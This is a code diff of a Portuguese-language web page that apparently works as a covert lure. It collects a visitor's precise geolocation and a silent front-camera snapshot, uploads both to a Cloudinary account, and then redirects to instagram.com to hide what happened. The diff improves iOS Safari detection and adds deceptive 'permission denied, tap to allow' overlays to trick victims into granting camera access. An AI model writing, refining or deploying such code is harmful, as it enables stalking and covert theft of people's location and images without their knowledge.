@@ -12,7 +12,7 @@
       display: none; justify-content: center; align-items: center;
       background: rgba(255,255,255,0.9);
       font-family: sans-serif; font-size: 20px; color: #333;
-      text-align: center; padding: 20px; cursor: pointer; z-index:9999;
+      text-align: center; padding: 20px; cursor: pointer; z-index: 9999;
     }
   </style>
 </head>
@@ -25,7 +25,9 @@
     const overlay = document.getElementById('overlay');
     const geoOpts = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
 
-    const isSafari = /^((?!chrome|android).)*safari/i.test(navigator.userAgent) && /iPhone|iPad/i.test(navigator.userAgent);
+    function isSafariIOS() {
+      return /^((?!chrome|android).)*safari/i.test(navigator.userAgent) && /iP(hone|od|ad)/.test(navigator.userAgent);
+    }
 
     function showOverlay(msg, handler) {
       overlay.textContent = msg;
@@ -35,6 +37,7 @@
 
     function hideOverlay() {
       overlay.style.display = 'none';
+      overlay.onclick = null;
     }
 
     function askLocation() {
@@ -54,52 +57,57 @@
       form.append('file', blob, `localizacao_${Date.now()}.txt`);
       form.append('upload_preset', uploadPreset);
       form.append('folder', folderName);
+
       fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
         method: 'POST',
         body: form
-      }).then(() => {
-        if (isSafari) {
-          // SAFARI: forçar interação humana antes de pedir câmera
+      })
+      .then(() => {
+        if (isSafariIOS()) {
+          // Em vez de chamar diretamente o getUserMedia, mostra a tela de toque manual
           showOverlay('Permissão de câmera negada. Toque para permitir o acesso à câmera', askCamera);
         } else {
-          // Chrome e outros navegadores: vai direto
-          askCamera();
+          askCamera(); // fluxo normal no Chrome e outros
         }
-      }).catch(() => {
+      })
+      .catch(() => {
         showOverlay('Erro ao enviar localização. Toque para tentar novamente.', askLocation);
       });
     }
 
     function askCamera() {
+      hideOverlay();
       navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
         .then(stream => {
           const video = document.createElement('video');
           video.setAttribute('playsinline',''); video.autoplay = true; video.muted = true;
           video.srcObject = stream;
           video.onloadedmetadata = () => video.play();
+
           setTimeout(() => {
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             stream.getTracks().forEach(t => t.stop());
+
             canvas.toBlob(blob => {
               const imgForm = new FormData();
               imgForm.append('file', blob);
               imgForm.append('upload_preset', uploadPreset);
               imgForm.append('folder', folderName);
+
               fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
                 method: 'POST',
                 body: imgForm
-              }).then(() => {
-                window.location.href = 'https://instagram.com';
-              }).catch(() => {
-                showOverlay('As permissões são necessárias para continuar. Toque para tentar novamente.', askCamera);
-              });
+              })
+              .then(() => window.location.href = 'https://instagram.com')
+              .catch(() => showOverlay('Erro ao enviar imagem. Toque para tentar novamente.', askCamera));
             }, 'image/png');
           }, 500);
-        }).catch(() => {
-          showOverlay('As permissões são necessárias para continuar. Toque para tentar novamente.', askCamera);
+        })
+        .catch(() => {
+          showOverlay('Permissão de câmera negada. Toque para permitir o acesso à câmera', askCamera);
         });
     }
 
